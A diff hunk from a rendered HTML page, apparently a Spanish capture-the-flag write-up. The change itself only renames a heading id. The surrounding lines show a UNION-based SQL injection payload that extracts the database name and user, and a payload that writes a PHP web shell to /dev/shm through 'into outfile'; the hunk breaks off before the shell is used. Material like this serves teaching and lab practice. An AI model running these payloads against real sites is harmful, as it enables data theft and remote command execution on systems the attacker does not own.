@@ -215,7 +215,7 @@
 </span></span></code></pre></div><p>Una vez que encontremos el numero podemos ver el usuario que esta corriendo la base de datos y elReconocimiento nombre de esta</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>product&amp;id<span style="color:#f92672">=</span>%0D%0A<span style="color:#960050;background-color:#1e0010">&#39;</span>+union+select+1,database<span style="color:#f92672">()</span>,user<span style="color:#f92672">()</span>,4,5,6,7,8--+-1
 </span></span></code></pre></div><p>También podrías ir sacando la información de esa base de datos, pero no tendrá nada mas que los relojes</p>
-<h2 id="ReconocimiRCEento">SQLI to RCE</h2>
+<h2 id="RCE">SQLI to RCE</h2>
 <p>Por ello vamos a intentar ejecutar comandos, primero vamos a crear un archivo PHP en la carpeta</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>product&amp;id<span style="color:#f92672">=</span>%0A%0D<span style="color:#e6db74">&#39;+union select &#34;&lt;?php system($_GET[&#39;</span>cmd<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">])</span>;?&gt;<span style="color:#e6db74">&#34;,2,3,4,5,6,7,8 into outfile &#34;</span>/dev/shm/script.php<span style="color:#e6db74">&#34; -- -1
 </span></span></span></code></pre></div><p>Y después vamos a ejecutarlo de esta manera</p>
